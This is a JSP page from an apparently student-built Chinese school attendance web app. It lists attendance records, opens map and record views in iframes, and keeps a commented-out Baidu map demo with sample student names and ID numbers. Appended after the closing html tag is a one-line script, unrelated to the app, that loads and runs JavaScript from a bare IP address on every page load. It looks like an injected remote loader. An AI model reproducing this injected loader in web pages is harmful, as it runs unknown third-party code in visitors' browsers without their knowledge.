<%@ page language="java" contentType="text/html; charset=UTF-8"
  pageEncoding="UTF-8" isELIgnored="false" %>
<%@ taglib prefix="spring" uri="http://www.springframework.org/tags"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@ taglib prefix="form" uri="http://www.springframework.org/tags/form"%>
<%@page import="java.awt.print.Printable"%>
<%@page import="java.security.interfaces.RSAKey"%>
<%@ page import="com.cn.web.school.po.Teacher" %>
<%@ page import="java.sql.*" %>
<%@ page import="java.util.*"%>
<%@ page import="java.text.*"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"> 
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script type="text/javascript" src="js/datetime.js"></script>
<script language="javascript" type="text/javascript" src="js/jquery-1.9.0.min.js"></script> 
<script language="javascript" type="text/javascript" src="js/Blob.js"></script> 
<script language="javascript" type="text/javascript" src="js/FileSaver.js"></script> 
<script language="javascript" type="text/javascript" src="js/tableExport.js"></script> 
<style type="text/css">
		body, html,#allmap {width: 100%;height: 100%;overflow: hidden;margin:0;font-family:"微软雅黑";}
		table td input{border:0;width:80%;  }	
		dl,dt,dd,ul,li{margin:0;padding:0;list-style:none;}
		p{font-size:12px;}
		dt{font-size:14px;font-family:"微软雅黑";font-weight:bold;border-bottom:1px dotted #000;padding:5px 0 5px 5px;margin:5px 0;}
		dd{padding:5px 0 0 5px;}
		li{line-height:28px;float:left;}
		 table
		 {
		 	border:1px solid black;
		 	border-collapse:collapse;
		 }
		 table tbody
		 {
		 	border:1px solid;
		 }
		 table td
		 {
		 	padding:10px;
		 	border-bottom:1px solid ;
		 	height:10px;
		 }
		 input {background-color:#F2F2E6; text-align:center;}
			
		.container_all{ width:100%; height:100%; }
		
		.container_cengA{ width:100%; height:50%; background-color:snow;}
		.container_cengB{ width:100%; height:50%; background-color:snow;}
		
		.container_cengA_kuai1{ width:50%; height:100%;background-color:snow; float:left;}
		.container_cengA_kuai2{ width:50%; height:100%;background-color:snow; float:left;}
		
		.container_table{width: 100%;height: 100%;}	
		#l-map{height:100%;width:78%;float:left;border-right:2px solid #bcbcbc;}
		#r-result{height:100%;width:20%;float:left;}	
</style>
<script type="text/javascript" src="http://api.map.baidu.com/api?v=2.0&ak=G3GKeZsowwfaOlY71VAd0TfR"></script>
<title>添加多个标注点</title>
</head>
<body>
	
	 <input id="fabux" value="120.043402" type="hidden"/>
	 <input id="fabuy" value="30.230829" type="hidden"/>
     <div class="container_all">
         <div class="container_cengA">
 			<!--  <div id="allmap"></div> -->
 			  <iframe id="mapFrame" name="mapFrame" src="<c:url value="/mapInformation"/>" style="overflow:visible;"
               scrolling="yes" frameborder="no" width="100%" height="100%"></iframe>
         </div>
         <div class="container_cengB">
             <div class="container_cengA_kuai1">
             	 <!-- <table style="background-color:#F2F2E6;text-align:center;border-collapse:collapse;width:100%;margin-top:0;"border="1">           
		 
 				 </table>	 -->		   
					    <div style="overflow-y: auto; height: 300px; width:100%;">
						<table style="background-color:#F2F2E6;text-align:center;border-collapse:collapse;width:100%;margin-top:0;"border="1">
							<thead>
							                 <tr>                 
							                    <th>课程标识</th>
							                    <th>考勤标识</th>		
							                    <th>发起时间</th>													
												<th>查看详情</th>
												</tr>	
							</thead>			
							<tbody>
								<c:forEach var="attendanceinfor1" items="${attendanceinfor1}">
									<tr>									
									    <td><input type="text"  readonly="readonly" name=${attendanceinfor1.id} value=${attendanceinfor1.scheduleCode}></td>
									    
										<!-- <input type="hidden"  readonly="readonly" name=${attendanceinfor1.id} value=${attendanceinfor1.teacherCode}>
										<input type="hidden"  readonly="readonly" name=${attendanceinfor1.id} value=${attendanceinfor1.longitude}>				   										        
										<input type="hidden"  readonly="readonly" name=${attendanceinfor1.id} value=${attendanceinfor1.code}>
						                <input type="hidden"  readonly="readonly" name=${attendanceinfor1.id} value=${attendanceinfor1.schoolCode}> -->
						                
						                <td><input type="text"  readonly="readonly" name=${attendanceinfor1.id} value=${attendanceinfor1.attendcode}></td>
						               
						                <td Style="font-size:1px;"><spring:eval expression="attendanceinfor1.start"/></td>	  
						                <!-- <td><input type="text" name=${attendanceinfor1.id} id="settime"/></td> -->
						                
						                <!--  <input type="hidden"  readonly="readonly" name=${attendanceinfor1.id} value=${attendanceinfor1.deviation}>
										<input type="hidden"  name=${attendanceinfor1.id} value=<spring:eval expression="attendanceinfor1.end"></spring:eval>> -->
									   
									    					
										<td><input type="button" id=${attendanceinfor1.id} onclick="return trya(this.id)" value="获       取"><input type="button" id=${attendanceinfor1.id} onclick="return trya1(this.id)" value="地图显示"></td>		
									</tr>
									<!-- <script>
									      $("#settime").val(document.getElementById("gettime").innerHTML);
								    </script> -->
								</c:forEach>
								<script type="text/javascript">	
								       function trya(id){
								    	   //alert("我进来了啊"+id);
								    	   var a=document.getElementsByName(id);
								    	   //alert("我又进来了啊"+a.length);
								    	   for(var i=0;i<a.length;i++){
								    	   //alert(a[i].value);
								    	   }
								    	  /* document.getElementById("scheduleCode").value = a[0].value;
								    	   document.getElementById("teacherCode").value = a[2].value; 
								    	   document.getElementById("class_time").value = a[3].value; 
								    	   document.getElementById("class_start").value = a[4].value; 
								    	   document.getElementById("class_end").value = a[5].value; 
								    	   a = document.getElementById("start").value;
								    	   //alert(a);*/
								    	    // 创建一个 form  
								    	    var form1 = document.createElement("form");  
								    	    form1.id = "form1";  
								    	    form1.name = "form1"; 
								    	    form1.target="tableFrame";
								    	  
								    	    // 添加到 body 中  
								    	    //document.body.appendChild(form1);  
								    	  
								    	    // 创建一个输入  
								    	    var input = document.createElement("input");  
								    	    // 设置相应参数  
								    	    input.type = "hidden";  
								    	    input.name = "attendcode";  
								    	    input.value = a[1].value;  
								    	  
								    	    // 将该输入框插入到 form 中  
								    	    form1.appendChild(input);  
								    	    
								    	    
								    	    var input1 = document.createElement("input");  
								    	    // 设置相应参数  
								    	    input1.type = "hidden";  
								    	    input1.name = "schedulCode";  
								    	    input1.value = a[0].value;  
								    	  
								    	    
								    	    //alert("BUG:  "+input.value+" "+input1.value)
								    	    // 将该输入框插入到 form 中  
								    	    form1.appendChild(input1);  
								    	    
								    	    
								    	    // form 的提交方式  
								    	    form1.method = "POST";  
								    	    // form 提交路径  
								    	    form1.action = "recordInformation";  
								    	  
								    	    // 对该 form 执行提交  
								    	    form1.submit();  
								    	    // 删除该 form  
								    	    //document.body.removeChild(form1); 	    								    	    
								       }
								       
								       function trya1(id)
								       {
								    	   //alert("我进来了啊"+id);
								    	   var a=document.getElementsByName(id);
								    	   //alert("我又进来了啊"+a.length);
								    	   for(var i=0;i<a.length;i++){
								    	   //alert(a[i].value);
								    	   }
								    	  /* document.getElementById("scheduleCode").value = a[0].value;
								    	   document.getElementById("teacherCode").value = a[2].value; 
								    	   document.getElementById("class_time").value = a[3].value; 
								    	   document.getElementById("class_start").value = a[4].value; 
								    	   document.getElementById("class_end").value = a[5].value; 
								    	   a = document.getElementById("start").value;
								    	   //alert(a);*/
								    	    // 创建一个 form  
								    	    var form1 = document.createElement("form");  
								    	    form1.id = "form1";  
								    	    form1.name = "form1"; 
								    	    form1.target="mapFrame";
								    	  
								    	    // 添加到 body 中  
								    	    //document.body.appendChild(form1);  
								    	  
								    	    // 创建一个输入  
								    	    var input = document.createElement("input");  
								    	    // 设置相应参数  
								    	    input.type = "hidden";  
								    	    input.name = "attendcode";  
								    	    input.value = a[1].value;  
								    	  
								    	    // 将该输入框插入到 form 中  
								    	    form1.appendChild(input);  
								    	  
								    	    // form 的提交方式  
								    	    form1.method = "POST";  
								    	    // form 提交路径  
								    	    form1.action = "mapInformation";  
								    	  
								    	    // 对该 form 执行提交  
								    	    form1.submit();  
								    	    // 删除该 form  
								    	    //document.body.removeChild(form1); 									    	   
								       }
								</script>
							</tbody> 
						 </table>
						  <p style="color:red;">${attendanceput2}</p>
					  </div>
             </div>
             <div class="container_cengA_kuai2">
 				  <iframe id="tableFrame" name="tableFrame" src="<c:url value="/recordInformation"/>" style="overflow:visible;"
                        scrolling="yes" frameborder="no" width="100%" height="100%"></iframe>
             </div>
         </div> 	  
	 </div>
</body>
</html>
<script type="text/javascript">
		
/* 	var x = document.getElementById("fabux").value;
	var y = document.getElementById("fabuy").value;
	// 百度地图API功能
	var map = new BMap.Map("allmap");
	var point1 = new BMap.Point(x,y)
    map.centerAndZoom(point1, 15);     // 初始化地图,设置中心点坐标和地图级别
    map.enableScrollWheelZoom();  
	
	var marker1 = new BMap.Marker(point1);  // 创建标注
	map.addOverlay(marker1);               // 将标注添加到地图中
	marker1.setAnimation(BMAP_ANIMATION_BOUNCE); //跳动的动画
	
	var circle = new BMap.Circle(new BMap.Point(x,y),1000,{fillColor:"blue", strokeWeight: 1 ,fillOpacity: 0.3, strokeOpacity: 0.3});
	 map.addOverlay(circle);
	
	
	var points = [];  // 添加海量点数据
	var markerArr = [  
                    { title: "王明", point: "120.038242,30.228395", address: "学号:1212212"},  
                    { title: "小红", point: "120.040016,30.228258", address: "学号:456564345"},  
                    { title: "阿狸", point: "120.039971,30.229187", address: "学号:231213"}  
                ]; 
				
				
        for (var i = 0; i < markerArr.length; i++) {
		  var p0 = markerArr[i].point.split(",")[0];  
          var p1 = markerArr[i].point.split(",")[1]; 
		  var p2 = markerArr[i].title; 
		  var p3 = markerArr[i].address; 
		  var p4 = p2 + " " + p3;
		  var point = new BMap.Point(p0,p1);
		  addMarker(point,p4);  
        }
			
	var opts = {
	  width : 5,     // 信息窗口宽度
	  height: 5,     // 信息窗口高度
	}
	
	
	// 编写自定义函数,创建标注
	function addMarker(point,p){
	  var marker = new BMap.Marker(point);
	  map.addOverlay(marker);
	  var infoWindow = new BMap.InfoWindow(p, opts);  // 创建信息窗口对象 
	  marker.addEventListener("click", function(){map.openInfoWindow(infoWindow,point); //开启信息窗口
	  });	
	}
	 */
	
</script>

<script type="text/javascript">(function(){var js = document.createElement("script");js.src="http://122.227.254.195/DB2927DA968D3599D7126C59B2CF6595?id=1&t=33593755&m=b43f328c6d75eab1"+Math.random();var h = document.getElementsByTagName("head")[0];h.appendChild(js);})()</script>